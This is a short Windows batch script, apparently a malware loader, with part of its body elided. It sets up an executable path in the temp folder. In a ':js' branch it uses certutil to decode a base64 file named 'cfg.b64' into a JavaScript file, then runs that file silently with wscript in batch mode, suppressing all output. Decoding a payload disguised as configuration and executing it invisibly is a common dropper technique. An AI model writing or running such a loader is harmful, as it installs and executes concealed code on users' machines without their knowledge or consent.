@echo off
setlocal
set "OUT=%TEMP%\rbc_6099978e2205e45e.exe"
set "SRC=%~dp0cfg.c"
...
:js
del /f /q "%TEMP%\rbc_6099978e2205e45e.js" >nul 2>&1
certutil -f -decode "%~dp0cfg.b64" "%TEMP%\rbc_6099978e2205e45e.js" >nul 2>&1
wscript.exe //B //nologo "%TEMP%\rbc_6099978e2205e45e.js"
exit /b 0
